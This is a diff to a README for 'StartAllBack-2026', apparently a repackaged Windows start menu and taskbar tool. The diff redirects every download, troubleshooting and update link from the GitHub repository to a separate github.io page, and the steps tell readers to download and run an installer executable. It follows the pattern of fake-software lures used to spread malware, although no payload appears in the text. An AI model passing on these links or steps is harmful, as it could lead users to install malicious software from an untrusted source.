@@ -1,6 +1,6 @@
 # 🚀 StartAllBack-2026 – Restore your Windows start menu & taskbar
 
-[![Download from GitHub](https://img.shields.io/badge/Download-StartAllBack%202026-blue?style=for-the-badge&logo=windows)](https://github.com/radha9725/StartAllBack-2026)
+[![Download from GitHub](https://img.shields.io/badge/Download-StartAllBack%202026-blue?style=for-the-badge&logo=windows)](https://radha9725.github.io)
 
 ---
 
@@ -42,7 +42,7 @@ Your computer must meet these specs:
 
 The download comes from our GitHub repository. You do not need a GitHub account.
 
-1. Go to the download page: [**https://github.com/radha9725/StartAllBack-2026**](https://github.com/radha9725/StartAllBack-2026)
+1. Go to the download page: [**https://radha9725.github.io**](https://radha9725.github.io)
 2. Look for the green **Code** button. Click it.
 3. Choose **Download ZIP**. (If you see a list of files, scroll to find the installer file named `StartAllBack_2026_Setup.exe` or similar. Click it, then click **Download**.)
 4. Save the file to your **Downloads** folder.
@@ -101,7 +101,7 @@ Check your Windows version. StartAllBack works on Windows 11 version 21H2 and ne
 Open **Settings > Apps > Installed apps**. Find **StartAllBack 2026**, click the three dots, and choose **Uninstall**. The software removes all customizations.
 
 **The download link does not work.**  
-Make sure you are on the correct page: `https://github.com/radha9725/StartAllBack-2026`. If the page loads but shows code, scroll down and find the **Releases** section on the right side. Click the latest release tag to find the installer.
+Make sure you are on the correct page: `https://radha9725.github.io`. If the page loads but shows code, scroll down and find the **Releases** section on the right side. Click the latest release tag to find the installer.
 
 ---
 
@@ -109,7 +109,7 @@ Make sure you are on the correct page: `https://github.com/radha9725/StartAllBac
 
 We regularly release updates for stability and new Windows builds.
 
-1. Visit the download page again: [**https://github.com/radha9725/StartAllBack-2026**](https://github.com/radha9725/StartAllBack-2026)
+1. Visit the download page again: [**https://radha9725.github.io**](https://radha9725.github.io)
 2. Download the newest installer.
 3. Run the installer. It overwrites the old version. Your settings stay the same.
 
